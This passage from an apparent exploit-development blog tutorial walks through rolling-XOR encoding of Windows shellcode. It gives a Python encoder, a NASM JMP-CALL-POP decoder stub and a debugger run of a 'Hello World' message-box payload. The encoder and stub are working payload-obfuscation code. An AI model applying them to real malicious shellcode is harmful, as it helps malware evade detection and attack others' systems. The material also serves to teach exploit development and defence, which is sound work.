  <li>Performs XOR between the first byte in array “xorout_f1/f2” and first byte in “code” variable and append result to new array “xorout_f1/f2”</li>
  <li>This basically takes the result of previous XOR operation as the input(byte) and performs XOR operation with the next byte and same happens with all other bytes.</li>
  <li>Continues the XOR operation till the last byte in “code” variable and final result will be saved in new array “xorout_f1/f2”.</li>
</ol>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#Author: Greycel
#Website: https://greycel.github.io
#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="n">code</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24\x2C\x57\x68\x72\x6c\x64\x2e\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8B\xDC\x57\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24\x40\xFF\x54\x24\x40\x57\xFF\xD0</span><span class="s">"</span><span class="p">)</span>

<span class="n">xorout_f1</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">xorout_f2</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">rand_key</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">255</span><span class="p">)</span>
<span class="n">xorout_f1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">rand_key</span><span class="p">)</span>
<span class="n">xorout_f2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">rand_key</span><span class="p">)</span>
<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[*] Random XOR key used: "</span> <span class="s">'0x</span><span class="si">%02</span><span class="s">x'</span> <span class="o">%</span><span class="n">rand_key</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">xorout_f1</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)):</span>  
    <span class="n">j</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="n">xorout_f1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">k</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="n">xorout_f2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">xorout_f1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
    <span class="n">xorout_f2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
<span class="n">xorout_f1</span> <span class="o">=</span> <span class="p">(</span><span class="s">","</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"0x</span><span class="si">%02</span><span class="s">x"</span> <span class="o">%</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">xorout_f1</span><span class="p">))</span>
<span class="n">xorout_f2</span> <span class="o">=</span> <span class="p">(</span><span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">%02</span><span class="s">x"</span> <span class="o">%</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">xorout_f2</span><span class="p">))</span>

<span class="k">print</span> <span class="s">"==================================="</span>
<span class="k">print</span> <span class="s">"Total Length: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">xorout_f2</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="s">"bytes"</span>
<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[*] Rolling Xor Output F1: </span><span class="se">\n</span><span class="si">%</span><span class="s">s "</span>  <span class="o">%</span><span class="n">xorout_f1</span>
<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[*] Rolling Xor Output F2: </span><span class="se">\n</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span><span class="n">xorout_f2</span></code></pre></figure>

<p><img src="/public/rollingXOR_01.jpg" /></p>

<hr />

<h3 id="decoder-stub">Decoder Stub</h3>

<p>Following is our decoder stub which helps us to decode the encoded shellcode. Here we will be using JMP-CALL-POP technique, to get to our encoded shellcode and thereafter we decode the shellcode back to original at runtime and execute it.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="p">;</span> <span class="n">Author</span><span class="p">:</span>   <span class="n">Greycel</span>
<span class="p">;</span> <span class="n">Website</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">greycel</span><span class="o">.</span><span class="n">github</span><span class="o">.</span><span class="n">io</span>
<span class="p">;</span> <span class="n">This</span> <span class="n">decodes</span> <span class="n">the</span> <span class="n">encoded</span> <span class="n">Rolling</span> <span class="n">XOR</span> <span class="n">scheme</span> <span class="n">back</span> <span class="n">to</span> <span class="n">its</span> <span class="n">original</span><span class="o">.</span>
<span class="p">;</span> <span class="n">To</span> <span class="n">avoid</span> <span class="n">NULL</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">update</span> <span class="n">the</span> <span class="n">Counter</span> <span class="n">instructions</span> <span class="s">"MOV CL, len"</span><span class="p">,</span>
<span class="p">;</span>  <span class="s">"DEC CL"</span><span class="p">,</span> <span class="s">"CMP CL,DL"</span> <span class="k">as</span> <span class="n">per</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">code</span> <span class="n">variable</span> <span class="o">.</span>


<span class="k">global</span> <span class="n">_start</span>

<span class="n">section</span> <span class="o">.</span><span class="n">text</span>
<span class="n">_start</span><span class="p">:</span>
        <span class="n">jmp</span> <span class="n">call_code</span>

<span class="n">decoder</span><span class="p">:</span>                   <span class="p">;</span><span class="n">Start</span> <span class="n">of</span> <span class="n">XOR</span> <span class="n">Operation</span>
        <span class="n">POP</span> <span class="n">ESI</span>            <span class="p">;</span><span class="n">Pointer</span> <span class="n">to</span> <span class="n">Shellcode</span>
        <span class="n">PUSH</span> <span class="n">ESI</span>           <span class="p">;</span><span class="n">Save</span> <span class="n">pointer</span> <span class="k">for</span> <span class="n">later</span> <span class="n">use</span>
        <span class="n">MOV</span> <span class="n">EDI</span><span class="p">,</span><span class="n">ESI</span>        <span class="p">;</span><span class="n">Copy</span> <span class="n">pointer</span> <span class="n">address</span> <span class="ow">in</span> <span class="n">EDI</span>
        <span class="n">XOR</span> <span class="n">ECX</span><span class="p">,</span><span class="n">ECX</span>        <span class="p">;</span><span class="n">Zeroout</span> <span class="n">the</span> <span class="n">registers</span> <span class="n">ECX</span><span class="p">,</span> <span class="n">EDX</span>
        <span class="n">MOV</span> <span class="n">EDX</span><span class="p">,</span><span class="n">ECX</span>
        <span class="n">MOV</span> <span class="n">CL</span><span class="p">,</span><span class="nb">len</span>         <span class="p">;</span><span class="n">Setup</span> <span class="n">counter</span> <span class="p">(</span><span class="n">Total</span> <span class="n">Length</span><span class="p">)</span>
<span class="n">loop1</span><span class="p">:</span>
        <span class="n">MOV</span> <span class="n">AL</span><span class="p">,[</span><span class="n">ESI</span><span class="p">]</span>       <span class="p">;</span><span class="n">Take</span> <span class="n">the</span> <span class="n">first</span> <span class="n">byte</span> <span class="n">of</span> <span class="n">shellcode</span>
        <span class="n">MOV</span> <span class="n">BL</span><span class="p">,[</span><span class="n">ESI</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>     <span class="p">;</span><span class="n">Take</span> <span class="n">the</span> <span class="n">second</span> <span class="n">byte</span> <span class="n">of</span> <span class="n">shellcode</span>
        <span class="n">XOR</span> <span class="n">AL</span><span class="p">,</span><span class="n">BL</span>          <span class="p">;</span><span class="n">Perform</span> <span class="n">XOR</span> <span class="ow">and</span> <span class="n">save</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">AL</span>
        <span class="n">MOV</span> <span class="p">[</span><span class="n">EDI</span><span class="p">],</span><span class="n">AL</span>       <span class="p">;</span><span class="n">Replace</span> <span class="n">the</span> <span class="n">first</span> <span class="nb">bytes</span> <span class="n">of</span> <span class="n">EDI</span> <span class="k">with</span> <span class="n">the</span> <span class="n">result</span>
        <span class="n">INC</span> <span class="n">ESI</span>            <span class="p">;</span><span class="n">Increment</span> <span class="n">ESI</span> <span class="ow">and</span> <span class="n">EDI</span>
        <span class="n">INC</span> <span class="n">EDI</span>
        <span class="n">DEC</span> <span class="n">CL</span>                <span class="p">;</span><span class="n">Decrement</span> <span class="n">the</span> <span class="n">Counter</span>
        <span class="n">CMP</span> <span class="n">CL</span><span class="p">,</span><span class="n">DL</span>             <span class="p">;</span><span class="n">Check</span> <span class="k">for</span> <span class="n">condition</span>
        <span class="n">JNZ</span> <span class="n">loop1</span>             <span class="p">;</span><span class="n">Jump</span> <span class="n">to</span> <span class="n">loop1</span> <span class="k">if</span> <span class="n">condition</span> <span class="n">has</span> <span class="ow">not</span> <span class="n">met</span>
        <span class="n">mov</span> <span class="n">byte</span><span class="p">[</span><span class="n">ESI</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mh">0x90</span>  <span class="p">;</span><span class="n">Replace</span> <span class="n">the</span> <span class="n">last</span> <span class="n">trail</span> <span class="n">byte</span> <span class="k">with</span> <span class="n">NOP</span>
        <span class="n">JMP</span> <span class="n">code</span>


<span class="n">call_code</span><span class="p">:</span>
        <span class="n">call</span> <span class="n">decoder</span>
        <span class="n">code</span><span class="p">:</span> <span class="n">db</span> <span class="mh">0xaf</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0xb2</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x99</span><span class="p">,</span><span class="mh">0xc3</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x9d</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xdb</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0xf0</span>

<span class="p">[</span><span class="o">.....</span><span class="p">]</span>

        <span class="mh">0xf4</span><span class="p">,</span><span class="mh">0xf7</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0xd2</span><span class="p">,</span><span class="mh">0xb1</span><span class="p">,</span><span class="mh">0xd9</span><span class="p">,</span><span class="mh">0x9c</span><span class="p">,</span><span class="mh">0xe4</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mh">0xad</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x42</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0xe9</span><span class="p">,</span><span class="mh">0xcd</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0xda</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0xf5</span>
        <span class="nb">len</span><span class="p">:</span>    <span class="n">equ</span> <span class="err">$</span><span class="o">-</span><span class="n">code</span></code></pre></figure>

<p>Having the above decoder stub ready, with the help of “nasm” compile the assembly code and generate the corresponding object file. Then use the “Objdump” to extract the decoding stub along with encoded shellcode appended to it. For commands to compile and extract shellcode <a href="/2017/04/15/Handy-Commands-ExpDev/">Check</a>.</p>

<p><img src="/public/rollingXOR_decode_stub_out.jpg" /></p>

<hr />

<h3 id="executing-the-shellcode-on-windows">Executing the Shellcode on Windows</h3>

<p>For POC purpose, I’ve used the encoded message box shellcode which would eventually gets decoded at runtime with our decoded stub and executes the Hello World Message Box Popup. Following is our actual decoder stub in debugger without the encoded shellcode</p>

<p><img src="/public/Decoder_Stub_in_DBG.jpg" /></p>

<p>Encoded shellcode within debugger. As per the decoder stub instruction “POP ESI” will pop the address (0x00446028) of encoded shellcode into “ESI” register, which is where the encoded shellcode begins.
<img src="/public/Encoded_Shellcode_in_DBG.jpg" /></p>

<p>By the time the decoder stub completes its execution we will have our actual shellcode ready to be executed from address (0x00446028) which is the beginning of shellcode and continues to execute our payload popping the “Hello World” message box.
<img src="/public/Decoded_Shellcode_in_DBG.jpg" /></p>

<p><img src="/public/Shellcode_execution_in_DBG.jpg" /></p>

    

    
      
      
      

      
    
  </article>
  
  <article class="post-body">
    <h2 class="post-title">
      <a href="/pentest/2017/04/15/Handy-Commands-ExpDev.html">
        Handy Commands for Exploit Development
      </a>
    </h2>
    <div class="post-meta">
  <span class="post-date">15 Apr 2017</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        <a href="/category/Pentest.html">
          Pentest
        </a>
      
    
  </span>
</div>


    
      <div class="message">
Handy Tools and Commands useful during Exploit Development.
</div>


    

    
      
      
      

      
        <a href="/pentest/2017/04/15/Handy-Commands-ExpDev.html">More &hellip;</a>
      
    
  </article>
  

  

</div>
    </main>

    <!-- Optional footer content -->

  </body>
</html>
